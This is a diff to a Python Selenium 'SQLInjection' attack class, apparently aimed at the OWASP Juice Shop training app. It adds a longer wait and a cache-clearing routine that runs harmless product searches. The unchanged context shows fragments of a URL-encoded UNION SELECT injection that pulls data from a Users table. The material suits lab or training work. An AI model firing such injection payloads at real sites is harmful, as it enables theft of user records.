@@ -47,8 +47,27 @@ class SQLInjection(Attack):
             "0%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2" \
             "C%20%278%27%2C%20%279%27%20FROM%20Users--"
         driver.get(self.base_url + sql_query)
-        time.sleep(3)
+        time.sleep(30)
+        #self.clear_cache()
         driver.quit()
+
+    def clear_cache(self):
+        driver = webdriver.Chrome(options=self.chrome_options)
+        sql_query_prepare = '/rest/products/search?q='
+        search_query = [] 
+        search_query.append("banana")
+        search_query.append("lemon")
+        search_query.append("juice shop")  
+        search_query.append("bike")  
+        search_query.append("pwning")  
+        search_query.append("forensic")  
+        search_query.append("orange")  
+        search_query.append("raspberry")  
+        search_query.append("something")
+        for query in search_query:
+            print(self.base_url + sql_query_prepare + query)
+            driver.get(self.base_url + sql_query_prepare + query)
+            time.sleep(1.5)
 
     def run_tryhard(self):
         driver = webdriver.Chrome(options=self.chrome_options)
@@ -91,6 +110,7 @@ class SQLInjection(Attack):
                    "7%2C%20%278%27%2C%20%279%27%20FROM%20Users--")
         time.sleep(2)
         """
+        #self.clear_cache()
         driver.quit()
 
 
